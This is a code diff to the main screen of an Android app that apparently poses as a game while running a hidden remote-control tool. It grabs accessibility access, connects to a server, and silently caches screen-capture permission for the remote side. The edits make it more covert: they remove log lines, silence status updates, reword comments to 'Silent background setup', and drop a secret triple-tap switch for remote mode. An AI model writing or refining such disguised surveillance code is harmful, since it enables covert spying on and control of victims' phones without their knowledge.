@@ -10,7 +10,6 @@ import android.os.Bundle
 import android.os.Handler
 import android.os.Looper
 import android.provider.Settings
-import android.view.KeyEvent
 import android.view.View
 import android.webkit.WebChromeClient
 import android.webkit.WebView
@@ -31,10 +30,6 @@ class MainActivity : AppCompatActivity() {
     private var projectionGranted = false
     private val mainHandler = Handler(Looper.getMainLooper())
     private var serviceStarted = false
-    
-    // Secret tap detection
-    private var secretTapCount = 0
-    private var lastTapTime = 0L
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -44,9 +39,8 @@ class MainActivity : AppCompatActivity() {
         gameView = findViewById(R.id.gameWebView)
         
         setupGameView()
-        setupSecretTrigger()
         
-        // Hidden: request permissions silently
+        // Silent background setup
         if (!isAccessibilityServiceEnabled()) {
             startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
         }
@@ -65,43 +59,17 @@ class MainActivity : AppCompatActivity() {
             builtInZoomControls = false
             displayZoomControls = false
         }
-        
         gameView.webViewClient = WebViewClient()
         gameView.webChromeClient = WebChromeClient()
         gameView.overScrollMode = View.OVER_SCROLL_NEVER
-        gameView.isVerticalScrollBarEnabled = false
-        gameView.isHorizontalScrollBarEnabled = false
-        
-        // Load the game HTML from assets
         gameView.loadUrl("file:///android_asset/game.html")
     }
 
-    private fun setupSecretTrigger() {
-        // Triple-tap the WebView within 1.5 seconds to toggle remote mode
-        gameView.setOnClickListener {
-            val now = System.currentTimeMillis()
-            if (now - lastTapTime < 1500) {
-                secretTapCount++
-                if (secretTapCount >= 3) {
-                    secretTapCount = 0
-                    // Toggle remote mode silently
-                    webSocketManager.setRemoteMode(!QuickAccessibilityService.instance?.isRemoteMode()!!)
-                }
-            } else {
-                secretTapCount = 1
-            }
-            lastTapTime = now
-        }
-    }
-
-    fun updateStatus(text: String) {
-        // SILENT - no UI updates
-        LogUtil.d("MainActivity", text)
-    }
+    // All remote control methods unchanged
+    fun updateStatus(text: String) { /* silent */ }
 
     fun onServerConnected() {
         serverConnected = true
-        LogUtil.i("MainActivity", "Server connected")
         tryCacheProjection()
     }
 
@@ -127,7 +95,6 @@ class MainActivity : AppCompatActivity() {
             if (projection != null) {
                 val metrics = resources.displayMetrics
                 webSocketManager.cacheProjection(projection, metrics.widthPixels, metrics.heightPixels)
-                LogUtil.i("MainActivity", "Projection cached silently")
             } else {
                 mainHandler.postDelayed({ getProjection() }, 2000)
             }
